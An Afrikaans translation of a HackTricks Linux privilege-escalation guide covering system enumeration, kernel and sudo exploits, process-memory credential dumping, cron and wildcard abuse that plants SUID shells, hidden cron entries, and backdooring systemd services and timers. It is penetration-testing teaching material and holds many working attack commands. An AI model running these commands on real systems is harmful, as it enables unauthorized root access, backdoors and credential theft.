# Linux Voorregverhoging

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

## Stelselinligting

### OS-inligting

Laten ons begin om 'n bietjie kennis van die bedryfstelsel wat loop, te verkry.
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Pad

As jy **skryftoestemmings het op enige lêer binne die `PAD`-veranderlike**, kan jy dalk sommige biblioteke of binaire oorvat:
```bash
echo $PATH
```
### Omgewingsinligting

Interessante inligting, wagwoorde of API-sleutels in die omgewingsveranderlikes?
```bash
(env || set) 2>/dev/null
```
### Kernel-uitbuitings

Kyk na die kernel-weergawe en of daar 'n uitbuiting is wat gebruik kan word om voorregte te verhoog.
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Jy kan 'n goeie lys van kwesbare kernweergawes en sommige reeds **gekompileerde exploits** hier vind: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) en [exploitdb sploits](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits).\
Ander webwerwe waar jy sommige **gekompileerde exploits** kan vind: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Om al die kwesbare kernweergawes van daardie webwerf te onttrek, kan jy die volgende doen:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Hulpmiddels wat kan help om te soek na kernel exploits is:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (voer UIT op slagoffer, kontroleer slegs exploits vir kernel 2.x)

Soek altyd die kernel weergawe in Google, dalk is jou kernel weergawe geskryf in 'n kernel exploit en dan sal jy seker wees dat hierdie exploit geldig is.

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo-weergawe

Gebaseer op die kwesbare sudo-weergawes wat voorkom in:
```bash
searchsploit sudo
```
Jy kan nagaan of die sudo weergawe kwesbaar is deur hierdie grep te gebruik.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

Van @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg handtekeningverifikasie het misluk

Kyk na die **smasher2-boks van HTB** vir 'n **voorbeeld** van hoe hierdie kwesbaarheid uitgebuit kan word.
```bash
dmesg 2>/dev/null | grep "signature"
```
### Meer stelselondersoek

Om volledige toegang tot 'n stelsel te verkry, is dit belangrik om 'n deeglike stelselondersoek uit te voer. Hier is 'n paar verdere tegnieke wat jy kan gebruik om meer inligting oor die stelsel te bekom:

#### 1. Lys van aktiewe prosesse

Om 'n lys van aktiewe prosesse op die stelsel te kry, gebruik die volgende opdrag:

```bash
ps aux
```

Hierdie opdrag sal 'n lys van alle aktiewe prosesse toon, insluitend die gebruikers wat die prosesse uitvoer.

#### 2. Lys van geïnstalleerde pakkette

Om 'n lys van geïnstalleerde pakkette op die stelsel te kry, gebruik die volgende opdrag:

```bash
dpkg -l
```

Hierdie opdrag sal 'n lys van alle geïnstalleerde pakkette toon, insluitend die weergawe en beskrywing van elke pakket.

#### 3. Lys van geïnstalleerde dienste

Om 'n lys van geïnstalleerde dienste op die stelsel te kry, gebruik die volgende opdrag:

```bash
service --status-all
```

Hierdie opdrag sal 'n lys van alle geïnstalleerde dienste toon, insluitend hul status (aan of af).

#### 4. Lys van aktiewe netwerkverbindings

Om 'n lys van aktiewe netwerkverbindings op die stelsel te kry, gebruik die volgende opdrag:

```bash
netstat -tuln
```

Hierdie opdrag sal 'n lys van alle aktiewe netwerkverbindings toon, insluitend die poorte wat gebruik word en die prosesse wat die verbindings gebruik.

#### 5. Lys van geïnstalleerde gebruikers

Om 'n lys van geïnstalleerde gebruikers op die stelsel te kry, gebruik die volgende opdrag:

```bash
cat /etc/passwd
```

Hierdie opdrag sal 'n lys van alle geïnstalleerde gebruikers toon, insluitend hul gebruikersname en gebruikers-ID.

Deur hierdie tegnieke te gebruik, kan jy waardevolle inligting oor die stelsel bekom wat jou kan help om verdere aanvalle uit te voer en toegang te verkry tot hoër bevoorregte rekenaarrekeninge.
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
### Enumereer moontlike verdedigingsmaatreëls

### AppArmor

AppArmor is 'n beveiligingsraamwerk wat in Linux gebruik word om toepassings te beperk tot slegs die hulpbronne en funksies wat hulle nodig het om te werk. Dit kan help om die impak van 'n aanval te verminder deur die toegang van 'n aanvaller tot kritieke stelselbronne te beperk. AppArmor kan gebruik word om die uitvoering van uitvoerbare lêers te beperk, toegang tot spesifieke lêers en mappe te beperk, en die uitvoering van spesifieke stelseloproepe te beperk. Dit is belangrik om te verseker dat AppArmor korrek ingestel en gekonfigureer is om die beste beskerming te bied teen potensiële aanvalle.
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity

Grsecurity is 'n uitgebreide veiligheidsoplossing vir Linux-stelsels wat spesifiek ontwerp is om die veiligheid van die bedryfstelsel te verhoog en die risiko van privilige-escalasie-aanvalle te verminder. Dit bied 'n verskeidenheid funksies en tegnieke wat ontwerp is om die aanvalsoppervlak van 'n Linux-stelsel te verminder en die moontlikheid van suksesvolle privilige-escalasie-aanvalle te verminder.

Grsecurity bevat 'n aantal funksies soos uitvoeringsbeperkings, geheuebeskerming, prosesbeheer en toegangsbeheer wat almal bydra tot die verhoogde veiligheid van die stelsel. Hierdie funksies kan help om die impak van aanvalle te verminder en die risiko van privilige-escalasie te verminder.

Om Grsecurity te gebruik, moet jy dit eers installeer en konfigureer op jou Linux-stelsel. Dit kan 'n bietjie gevorderde kennis en ervaring vereis, maar dit kan 'n waardevolle bydrae lewer tot die verhoogde veiligheid van jou stelsel.

Dit is belangrik om te verstaan dat Grsecurity nie 'n volledige oplossing vir privilige-escalasie is nie, maar eerder 'n aanvullende laag van veiligheid wat kan help om die risiko te verminder. Dit is belangrik om ander veiligheidsmaatreëls en -praktyke te implementeer om 'n algehele veilige omgewing te verseker.
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX

PaX is 'n sekuriteitsfunksie wat in die Linux-kernel geïmplementeer is om die uitbuiting van sekuriteitskwessies te voorkom. Dit bied 'n verskeidenheid tegnieke om die uitvoering van skadelike kodes te beperk en die integriteit van die stelsel te beskerm.

PaX maak gebruik van 'n tegniek genaamd uitvoeringsbeskerming (executable space protection) om te voorkom dat uitvoerbare areas van die geheue gebruik word vir die uitvoering van skadelike kodes. Dit maak ook gebruik van adresruimte-indeling (address space layout randomization) om die voorspelbaarheid van geheue-adresse te verminder en die moeilikheid van aanvalle te verhoog.

'n Verdere tegniek wat deur PaX gebruik word, is data-uitvoeringsvoorkoming (data execution prevention), wat verhoed dat data-areas van die geheue gebruik word vir die uitvoering van kodes. Dit beperk die moontlikheid van aanvallers om skadelike kodes in die geheue te plaas en uit te voer.

PaX bied ook 'n funksie genaamd ASLR (address space layout randomization), wat die geheue-adresse van uitvoerbare areas willekeurig verskuif. Dit maak dit moeiliker vir aanvallers om die korrekte adresse te raai en suksesvolle aanvalle uit te voer.

Deur die implementering van PaX kan die sekuriteit van 'n Linux-stelsel aansienlik verbeter word deur die risiko van uitbuiting van sekuriteitskwessies te verminder. Dit is 'n waardevolle tegniek om te oorweeg vir die verharding van 'n Linux-stelsel.
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield

Execshield is 'n veiligheidsfunksie wat beskikbaar is in sommige Linux-stelsels. Dit is ontwerp om die uitvoering van kwaadwillige kodes te beperk deur die geheuebeskerming te versterk. Execshield maak gebruik van tegnieke soos uitvoeringsbeskerming, geheuebeskerming en adresruimte-indeling om die risiko van uitvoering van skadelike kodes te verminder. Dit kan help om die privaatheid en integriteit van 'n stelsel te beskerm deur die voorkoming van privilige-escalasie-aanvalle.
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux

SElinux (Security-Enhanced Linux) is 'n veiligheidsraamwerk wat in Linux-kernels geïmplementeer is. Dit bied 'n ekstra laag van beveiliging deur toegangsbeheer en afdwinging van beveiligingsbeleide te bied. SElinux maak gebruik van beveiligingsbeleide om te bepaal watter aksies toegelaat of verhinder word deur gebruikers, toepassings en processesse.

SElinux kan help om die impak van 'n aanval te verminder deur die beperking van die toegang wat 'n aanvaller kan verkry. Dit kan ook help om die risiko van privilige-escalasie te verminder deur die beperking van die aksies wat 'n gebruiker of toepassing kan uitvoer.

Om SElinux te gebruik, moet jy die beleid instel en aktiveer. Jy kan ook die beleid aanpas om spesifieke vereistes te pas. Dit is belangrik om te verstaan hoe SElinux werk en hoe om dit korrek te konfigureer om die beste beveiliging te verseker.

Hier is 'n paar nuttige opdragreëls vir die hantering van SElinux:

- `sestatus`: Hierdie opdrag gee 'n oorsig van die huidige status van SElinux.
- `setenforce`: Hierdie opdrag stel die afdwingingsmodus van SElinux in (af, permissief of afdwingend).
- `getenforce`: Hierdie opdrag gee die huidige afdwingingsmodus van SElinux.
- `semanage`: Hierdie opdrag word gebruik om SElinux-beleid te bestuur, insluitend die byvoeging en verwydering van beleidstipes.
- `restorecon`: Hierdie opdrag herstel die kontekst van lêers en gidses volgens die huidige SElinux-beleid.

Deur SElinux korrek te konfigureer en te bestuur, kan jy die beveiliging van jou Linux-stelsel versterk en die risiko van privilige-escalasie verminder.
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR

Address Space Layout Randomization (ASLR) is 'n tegniek wat gebruik word om die veiligheid van 'n stelsel te verhoog deur die posisie van geheue-adresse te willekeurig te maak. Dit maak dit moeiliker vir aanvallers om te voorspel waar spesifieke funksies of data in die geheue van 'n stelsel geleë is.

ASLR werk deur die willekeurige verskuiwing van die basisadres van die uitvoerbare kode, die stak, die heap en ander geheue-areas. Dit beteken dat elke keer as 'n program uitgevoer word, die posisie van hierdie geheue-areas verander. Hierdie willekeurige verskuiwing maak dit moeiliker vir 'n aanvaller om te bepaal waar spesifieke funksies of data in die geheue van 'n stelsel geleë is, wat die suksesvolle uitbuiting van 'n kwesbaarheid bemoeilik.

ASLR is 'n belangrike tegniek vir die voorkoming van aanvalle soos bufferoverloop en uitvoering van kwaadwillige kode. Dit is egter belangrik om daarop te let dat ASLR nie 'n volledige oplossing vir die voorkoming van privilige-escalasie is nie, maar eerder een van die maatreëls wat geneem kan word om die veiligheid van 'n stelsel te verhoog.
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Uitbreek

As jy binne 'n Docker-houer is, kan jy probeer om daaruit te ontsnap:

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## Bestuurders

Kyk **wat is gemonteer en ongemonteer**, waar en waarom. As iets ongemonteer is, kan jy probeer om dit te monteer en te kyk vir privaat inligting.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Nuttige sagteware

Enumerateer nuttige binaire
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Kyk ook of **enige kompilator geïnstalleer is**. Dit is nuttig as jy 'n kernel-exploit moet gebruik, aangesien dit aanbeveel word om dit op die masjien waar jy dit gaan gebruik (of op 'n soortgelyke masjien) te kompileer.
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Kwesbare sagteware geïnstalleer

Kyk na die **weergawe van die geïnstalleerde pakkette en dienste**. Miskien is daar 'n ou Nagios-weergawe (byvoorbeeld) wat uitgebuit kan word om voorregte te verhoog...\
Dit word aanbeveel om handmatig die weergawe van die meer verdagte geïnstalleerde sagteware te ondersoek.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
As jy SSH-toegang tot die masjien het, kan jy ook **openVAS** gebruik om te kyk vir verouderde en kwesbare sagteware wat binne die masjien geïnstalleer is.

{% hint style="info" %}
_Merk op dat hierdie opdragte baie inligting sal toon wat meestal nutteloos sal wees, daarom word dit aanbeveel om sekere toepassings soos OpenVAS of soortgelyk te gebruik wat sal nagaan of enige geïnstalleerde sagteware weergawe kwesbaar is vir bekende aanvalle_
{% endhint %}

## Prosesse

Kyk na **watter prosesse** uitgevoer word en kyk of enige proses **meer bevoegdhede het as wat dit behoort te hê** (miskien 'n tomcat wat deur root uitgevoer word?)
```bash
ps aux
ps -ef
top -n 1
```
Altyd kyk vir moontlike [**electron/cef/chromium debuggers** wat loop, jy kan dit misbruik om voorregte te verhoog](electron-cef-chromium-debugger-abuse.md). **Linpeas** vind dit deur die `--inspect` parameter binne die opdraglyn van die proses te ondersoek.\
Kyk ook na jou voorregte oor die proses binêre lêers, miskien kan jy iemand oorskryf.

### Prosessemonitoring

Jy kan gereedskap soos [**pspy**](https://github.com/DominicBreuker/pspy) gebruik om prosesse te monitor. Dit kan baie nuttig wees om kwesbare prosesse te identifiseer wat gereeld uitgevoer word of wanneer 'n stel vereistes voldoen word.

### Prosessgeheue

Sommige dienste van 'n bediener stoor **geloofsbriewe in duidelike teks binne die geheue**.\
Gewoonlik sal jy **root-voorregte** benodig om die geheue van prosesse wat aan ander gebruikers behoort te lees, daarom is dit gewoonlik meer nuttig wanneer jy reeds root is en meer geloofsbriewe wil ontdek.\
Onthou egter dat **as 'n gewone gebruiker kan jy die geheue van die prosesse wat jy besit lees**.

{% hint style="warning" %}
Let daarop dat die meeste masjiene teenwoordig **nie ptrace toelaat nie** wat beteken dat jy nie ander prosesse wat aan jou onbevoorregte gebruiker behoort kan dump nie.

Die lêer _**/proc/sys/kernel/yama/ptrace\_scope**_ beheer die toeganklikheid van ptrace:

* **kernel.yama.ptrace\_scope = 0**: alle prosesse kan gedebug word, solank hulle dieselfde uid het. Dit is die klassieke manier waarop ptracing gewerk het.
* **kernel.yama.ptrace\_scope = 1**: slegs 'n ouerproses kan gedebug word.
* **kernel.yama.ptrace\_scope = 2**: Slegs 'n administrateur kan ptrace gebruik, aangesien dit die CAP\_SYS\_PTRACE-vermoë vereis.
* **kernel.yama.ptrace\_scope = 3**: Geen prosesse mag met ptrace nagespeur word nie. Nadat dit ingestel is, is 'n herlaai nodig om ptracing weer in te skakel.
{% endhint %}

#### GDB

As jy toegang het tot die geheue van 'n FTP-diens (byvoorbeeld) kan jy die Heap kry en binnein soek vir geloofsbriewe.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB-skrip

{% code title="dump-memory.sh" %}
```bash
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
{% endcode %}

#### /proc/$pid/maps & /proc/$pid/mem

Vir 'n gegewe proses-ID, wys **maps hoe geheue gekaart is binne daardie proses se** virtuele adresruimte; dit wys ook die **toestemmings van elke gekaarte gebied**. Die **mem** pseudobestand **blootstel die proses se geheue self**. Uit die **maps**-lêer weet ons watter **geheuegebiede leesbaar is** en hul verskuiwings. Ons gebruik hierdie inligting om **in die mem-lêer te soek en alle leesbare gebiede** na 'n lêer te dump.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` bied toegang tot die stelsel se **fisiese** geheue, nie die virtuele geheue nie. Die kernel se virtuele adresruimte kan benader word deur gebruik te maak van /dev/kmem.\
Gewoonlik is `/dev/mem` slegs leesbaar deur die **root** en **kmem** groep.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump vir Linux

ProcDump is 'n Linux-weergawe van die klassieke ProcDump-hulpmiddel uit die Sysinternals-suite van hulpmiddels vir Windows. Kry dit by [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Gereedskap

Om 'n proses se geheue te dump, kan jy die volgende gebruik:

* [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
* [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Jy kan handmatig die root vereistes verwyder en die proses wat deur jou besit, dump
* Skrip A.5 vanaf [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root word vereis)

### Legitieme inligting uit Proseshersens

#### Handmatige voorbeeld

As jy vind dat die verifikasieproses uitgevoer word:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Jy kan die proses dump (sien vorige afdelings om verskillende maniere te vind om die geheue van 'n proses te dump) en soek na geloofsbriewe binne die geheue:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Die instrument [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) sal **duidelike tekskredensiale uit die geheue steel** en uit sommige **bekende lêers**. Dit vereis root-voorregte om behoorlik te werk.

| Funksie                                            | Prosesnaam           |
| -------------------------------------------------- | -------------------- |
| GDM-wagwoord (Kali Desktop, Debian Desktop)        | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop)  | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                           | lightdm              |
| VSFTPd (Aktiewe FTP-verbindings)                   | vsftpd               |
| Apache2 (Aktiewe HTTP Basiese Verifikasie-sessies) | apache2              |
| OpenSSH (Aktiewe SSH-sessies - Sudo Gebruik)       | sshd:                |

#### Soek Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Geskeduleerde/Cron take

Kyk of enige geskeduleerde taak kwesbaar is. Dalk kan jy voordeel trek uit 'n skrips wat deur root uitgevoer word (wildcard kwesbaarheid? kan lêers wysig wat root gebruik? gebruik simboliese skakels? skep spesifieke lêers in die gids wat root gebruik?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron-patroon

Byvoorbeeld, binne _/etc/crontab_ kan jy die PAD vind: _PAD=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Let op hoe die gebruiker "user" skryfregte het oor /home/user_)

As die root-gebruiker probeer om 'n bevel of skripsie uit te voer sonder om die pad in te stel binne hierdie crontab. Byvoorbeeld: _\* \* \* \* root overwrite.sh_\
Dan kan jy 'n root-skulp verkry deur die volgende te gebruik:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron wat 'n skrip met 'n wildcard gebruik (Wildcard-injectie)

As 'n skrip deur root uitgevoer word en 'n "**\***" binne 'n opdrag bevat, kan jy dit uitbuit om onverwagte dinge te doen (soos bevoorregte eskalasie). Voorbeeld:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**As die wildkaart voorafgegaan word deur 'n pad soos** _**/some/path/\***_ **, is dit nie kwesbaar nie (selfs** _**./\***_ **is nie).**

Lees die volgende bladsy vir meer wildkaart-uitbuitingstruuks:

{% content-ref url="wildcards-spare-tricks.md" %}
[wildcards-spare-tricks.md](wildcards-spare-tricks.md)
{% endcontent-ref %}

### Cron-skrips oorskrywing en simboliese skakeling

As jy **'n cron-skrips wat deur root uitgevoer word, kan wysig**, kan jy baie maklik 'n skulp verkry:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
As die skripsie wat deur root uitgevoer word 'n **gids gebruik waarin jy volle toegang het**, mag dit nuttig wees om daardie gids te verwyder en 'n **symlink-gids na 'n ander gids te skep** wat 'n skrips beheer deur jou bedien.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Gereelde cron-werkies

Jy kan die prosesse monitor om te soek na prosesse wat elke 1, 2 of 5 minute uitgevoer word. Miskien kan jy daarvan gebruik maak en voorregte verhoog.

Byvoorbeeld, om **elke 0.1s vir 1 minuut te monitor**, **sorteer volgens minder uitgevoerde opdragte** en die opdragte te verwyder wat die meeste uitgevoer is, kan jy doen:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Jy kan ook gebruik maak van** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (dit sal elke proses monitor en lys wat begin).

### Onsigbare cron-take

Dit is moontlik om 'n cron-taak te skep **deur 'n wagenretour na 'n kommentaar te plaas** (sonder 'n nuwe lyn karakter), en die cron-taak sal werk. Voorbeeld (let op die wagenretour karakter):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Dienste

### Skryfbare _.service_ lêers

Kyk of jy enige `.service` lêer kan skryf. As jy kan, **kan jy dit wysig** sodat dit jou **agterdeur uitvoer** wanneer die diens **begin**, **herbegin** of **gestop** word (miskien moet jy wag totdat die masjien herlaai word).\
Byvoorbeeld, skep jou agterdeur binne die .service lêer met **`ExecStart=/tmp/script.sh`**

### Skryfbare diens-binêre lêers

Hou in gedagte dat as jy **skryftoestemmings het oor binêre lêers wat deur dienste uitgevoer word**, jy hulle kan verander na agterdeure sodat wanneer die dienste heruitgevoer word, die agterdeure uitgevoer sal word.

### systemd-PAD - Relatiewe paaie

Jy kan die PAD wat deur **systemd** gebruik word, sien met:
```bash
systemctl show-environment
```
As jy vind dat jy kan **skryf** in enige van die lêers van die pad, kan jy moontlik **voorregte verhoog**. Jy moet soek na **relatiewe paaie wat gebruik word in dienskonfigurasie**-lêers soos:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Vervolgens skep 'n **uitvoerbare** lêer met dieselfde naam as die relatiewe pad binêre lêer binne die systemd PAD-vouer waarin jy kan skryf, en wanneer die diens gevra word om die kwesbare aksie (**Begin**, **Stop**, **Herlaai**) uit te voer, sal jou **agterdeur uitgevoer word** (ongepriviligeerde gebruikers kan gewoonlik nie dienste begin/stop nie, maar kyk of jy `sudo -l` kan gebruik).

**Leer meer oor dienste met `man systemd.service`.**

## **Tydskakelaars**

**Tydskakelaars** is systemd eenheidslêers waarvan die naam eindig op `**.timer**` wat `**.service**` lêers of gebeurtenisse beheer. **Tydskakelaars** kan gebruik word as 'n alternatief vir cron, aangesien hulle ingeboude ondersteuning vir kalender-tydgebeurtenisse en monotoniese tydgebeurtenisse het en asinkronies uitgevoer kan word.

Jy kan al die tydskakelaars opsom met:
```bash
systemctl list-timers --all
```
### Skryfbare timers

As jy 'n tydhouer kan wysig, kan jy dit laat uitvoer met bestaande systemd.unit (soos 'n `.service` of 'n `.target`)
```bash
Unit=backdoor.service
```
In die dokumentasie kan jy lees wat die Eenheid is:

> Die eenheid wat geaktiveer moet word wanneer hierdie tydtuig verloop. Die argument is 'n eenheidsnaam, waarvan die agtervoegsel nie ".timer" is nie. As dit nie gespesifiseer word nie, is hierdie waarde verstek 'n diens wat dieselfde naam as die tydtuig-eenheid het, behalwe vir die agtervoegsel. (Sien hierbo.) Dit word aanbeveel dat die geaktiveerde eenheidsnaam en die eenheidsnaam van die tydtuig-eenheid identies genoem word, behalwe vir die agtervoegsel.

Daarom sal jy hierdie toestemming moet misbruik deur:

* Vind 'n systemd-eenheid (soos 'n `.service`) wat 'n **skryfbare binêre lêer uitvoer**
* Vind 'n systemd-eenheid wat 'n **relatiewe pad uitvoer** en jy het **skryfregte** oor die **systemd-PAD** (om daardie uitvoerbare lêer na te boots)

**Leer meer oor tydtuie met `man systemd.timer`.**

### **Tydtuig aktiveer**

Om 'n tydtuig te aktiveer, benodig jy root-regte en voer die volgende uit:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Let daarop dat die **tydhouer** geaktiveer word deur 'n simboliese skakel daarvan te skep op `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) maak **proseskommunikasie** moontlik op dieselfde of verskillende rekenaars binne klient-bedienermodelle. Hulle maak gebruik van standaard Unix-beskrywerlêers vir inter-rekenaarkommunikasie en word opgestel deur middel van `.socket`-lêers.

Sockets kan gekonfigureer word met behulp van `.socket`-lêers.

**Leer meer oor sockets met `man systemd.socket`.** Binne hierdie lêer kan verskeie interessante parameters gekonfigureer word:

* `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Hierdie opsies is verskillend, maar 'n opsomming word gebruik om aan te dui **waar dit gaan luister** na die socket (die pad van die AF\_UNIX socket-lêer, die IPv4/6 en/of poortnommer om na te luister, ens.)
